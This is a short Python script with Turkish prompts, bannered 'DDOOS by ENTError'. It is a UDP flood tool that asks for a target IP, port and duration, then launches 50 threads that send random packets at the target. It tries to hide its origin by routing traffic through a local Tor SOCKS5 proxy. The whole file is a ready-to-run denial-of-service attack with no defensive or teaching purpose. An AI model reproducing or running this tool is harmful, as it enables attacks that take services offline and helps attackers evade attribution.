import socket
import threading
import time
import socks  # Tor için
import colorama
from colorama import Fore, Style, init
import random  # Rastgele paketler için

init()  # Colorama'yı başlat

# Geliştirilmiş ve güzel banner
print(Fore.CYAN + Style.BRIGHT + r"""
================================================================
   DDDD   DDDD    OOOO    OOOO    SSSSS
   D   D  D   D  O    O  O    O  S
   D    D D    D O    O  O    O  SSSSS
   D     D D     O    O  O    O       S
   DDDD   DDDD    OOOO    OOOO    SSSSS
================================================================
""" + Fore.YELLOW + Style.BRIGHT + "          by ENTError          " + Fore.CYAN + Style.BRIGHT + """
================================================================
""" + Style.RESET_ALL)

# Kullanıcıdan giriş al
print(Fore.YELLOW + "Hedef IP girin: " + Style.RESET_ALL, end='')
target_ip = input()

print(Fore.YELLOW + "Hedef Port girin: " + Style.RESET_ALL, end='')
target_port = int(input())

print(Fore.YELLOW + "Süre (saniye) girin: " + Style.RESET_ALL, end='')
duration = int(input())

def udp_flood(target_ip, target_port, packet_size=1024, duration=60):
    packets = ''.join([chr(random.randint(0, 255)) for _ in range(packet_size)])  # Rastgele paketler
    socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)  # Tor proxy'si
    socket.socket = socks.socksocket  # Socket'i Tor ile bağla
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock.sendto(packets.encode(), (target_ip, target_port))
        except:
            pass  # Devam et

# Thread'leri başlat
for i in range(50):  # Artırılmış thread sayısı
    thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, 1024, duration))
    thread.start()

print(Fore.CYAN + Style.BRIGHT + "Saldırı başlatıldı. Süre dolunca duracak." + Style.RESET_ALL)
